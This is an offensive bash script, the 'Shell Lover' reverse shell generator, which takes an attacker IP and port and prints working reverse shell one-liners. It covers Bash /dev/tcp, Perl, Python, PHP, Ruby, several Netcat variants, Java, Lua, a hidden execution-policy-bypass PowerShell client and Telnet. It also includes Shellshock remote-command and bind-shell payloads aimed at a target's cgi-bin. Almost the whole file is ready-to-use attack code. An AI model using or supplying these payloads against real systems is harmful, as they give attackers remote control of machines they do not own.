#!/bin/bash
# Reset
Color_Off='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black   
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
# High Intensity
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White
# Marks
pos="[${Green}+${Color_Off}]"
neg="[${Red}-${Color_Off}]"

function ascii_art(){

	echo -e """
${Red}╔═╗${Green}┬ ┬┌─┐┬  ┬    ${Green}╦  ${Red}┌─┐┬  ┬┌─┐┬─┐
${Red}╚═╗${Green}├─┤├┤ │  │    ${Green}║  ${Red}│ │└┐┌┘├┤ ├┬┘
${Red}╚═╝${Green}┴ ┴└─┘┴─┘┴─┘  ${Green}╩═╝${Red}└─┘ └┘ └─┘┴└─   
${IWhite}Author : Captain_M!dnight	
[${Red}NOTICE${Color_Off}]Texts in red are changable
${Color_Off}"""
}

function prompt(){

	printf "${Red}♥${IGreen}Shells${Red}♥${IGreen}:${Color_Off} "
}

function reverse_shell_list(){

    echo -e """
[${Blue}1${Color_Off}]Bash		 [${IRed}2${Color_Off}]Ruby

[${Green}3${Color_Off}]Perl		 [${Cyan}4${Color_Off}]Netcat

[${Yellow}5${Color_Off}]Python	 [${IYellow}6${Color_Off}]Java

[${Purple}7${Color_Off}]PHP		 [${IBlue}8${Color_Off}]Shellshock

[${Cyan}9${Color_Off}]Lua           [${Blue}10${Color_Off}]Powershell

[${Green}11${Color_Off}]Telnet

	"""
    while true;do
        prompt
	read shell_type

	case $shell_type in
	    1) bash_shell;;
	    2) ruby_shell;;
	    3) perl_shell;;
	    4) netcat_shell;;
	    5) python_shell;;
	    6) java_shell;;
	    7) php_shell;;
	    8) shellshock;;
	    9) lua_shell;;
	   10) powershell;;
           11) telnet;;
	   "exit"|"q"|"quit") exit 0;;
	   *)echo -e "[-]Enter the shell number";reverse_shell_list;;
	esac
    done
}

## make changable things with diffrent color ##

function bash_shell(){

	echo -e "${pos}${Yellow}Bash shell:${Color_Off} bash -i >& /dev/tcp/${Red}$ipaddr/$port${Color_Off} 0>&1"
}

function perl_shell(){
	
	echo -e "${pos}${Yellow}Perl shell:${Color_Off} perl -e 'use Socket;${Red}\$i=\"$ipaddr\"${Color_Off};${Red}\$p=$port${Color_Off};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

}

function python_shell(){
	
	echo -e "${pos}${Yellow}Python shell:${Color_Off} python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((${Red}\"$ipaddr\",$port${Color_Off}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

}

function php_shell(){

	echo -e "${pos}${Yellow}PHP shell:${Color_Off} php -r '\$sock=fsockopen(\"${Red}$ipaddr\",$port${Color_Off});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

}

function ruby_shell(){

	echo -e "${pos}${Yellow}Ruby shell:${Color_Off} ruby -rsocket -e'f=TCPSocket.open(${Red}\"$ipaddr\",$port${Color_Off}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

}

function netcat_shell(){

	echo -e "${pos}${Yellow}Netcat shell [1]:${Color_Off} nc -e /bin/sh ${Red}$ipaddr $port${Color_Off}\n"
	
	echo -e "${pos}${Yellow}Netcat shell [2]:${Color_Off} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${Red}$ipaddr $port${Color_Off} >/tmp/f\n"

        echo -e "${pos}${Yellow}Netcat shell [3]:${Color_Off} rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc ${Red}$ipaddr $port${Color_Off} 1>/tmp/l"
}

function java_shell(){

	echo -e """${pos}${Yellow}Java shell:${Color_Off} 
r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${Red}$ipaddr${Color_Off}/${Red}$port${Color_Off};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
p.waitFor()
	"""
}

function shellshock(){

	echo -e "${pos}${Yellow}Shellshock [RCE]:${Color_Off} wget -U \"() { test;};echo \"Content-type: text/plain\"; echo; echo; ${Red}YOUR_COMMAND${Color_Off}\" http://${Red}TARGET_IP${Color_Off}/cgi-bin/status\n"
	
	echo -e "${pos}${Yellow}Shellshock [bind shell]:${Color_Off}"
	
	echo "echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc -l -p 4444 -e /bin/sh\\r\\nHost: <TARGET_IP>\\r\\nConnection: close\\r\\n\\r\\n\" | nc <TARGET_IP> 80"

}

function lua_shell(){

	echo -e "${pos}${Yellow}Lua shell:${Color_Off} lua5.1 -e 'local host,port = \"${Red}$ipaddr${Color_Off}\",${Red}$port${Color_Off} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"

}
function powershell(){
    
    echo -e "${pos}${Yellow}Powershell:${Color_Off} powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${Red}$ipaddr${Color_Off}\",${Red}$port${Color_Off});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

}

function telnet(){

    echo -e "${pos}${Yellow}Telnet Reverse Shell:${Color_Off} telnet ${Red}$ipaddr $port${Color_Off} | /bin/bash | telnet ${Red}$ipaddr 9999${Color_Off}"
    echo -e "[${Red}*${Color_Off}]Set two listeners:
   [${Red}Input${Color_Off}]  nc -lnvvp ${Red}$port${Color_Off}
   [${Green}Output${Color_Off}] nc -lnvvp ${Red}9999${Color_Off}"
}

ipaddr=$1
port=$2
if [[ -z $1 ]] && [[ -z $2 ]];then
    ascii_art
    echo "[*]Usage: $0 <ipaddress> <port>"
    exit 1
else
    ascii_art
    reverse_shell_list
fi
